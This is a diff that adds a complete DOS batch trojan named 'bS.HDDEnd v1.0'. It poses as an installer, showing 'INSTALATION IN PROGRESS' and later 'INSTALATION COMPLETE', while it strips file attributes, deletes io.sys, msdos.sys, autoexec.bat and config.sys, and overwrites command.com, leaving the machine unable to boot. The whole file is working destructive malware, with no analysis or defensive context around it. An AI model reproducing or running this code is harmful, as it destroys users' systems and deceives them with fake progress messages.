@@ -1,0 +1,31 @@
+@echo off
+cls
+
+rem **************************
+rem * Name:   bS.HDDEnd v1.0 *
+rem * Author: BaCkSpAcE      *
+rem **************************
+
+
+rem ---------- START HERE ----------
+echo. INSTALATION IN PROGRESS...
+c:  >> c:\temp
+cd\ >> c:\temp
+
+
+rem ---------- START DELETING ----------
+attrib -a -h -r -s
+del io.sys >> c:\temp
+del msdos.sys >> c:\temp
+del autoexec.bat >> c:\temp
+del config.sys >> c:\temp
+
+
+rem ---------- FINISHING ----------
+del temp >> c:\command.com
+echo. INSTALATION COMPLETE ! PLEASE REBOOT YOUR COMPUTER !
+
+
+
+
+
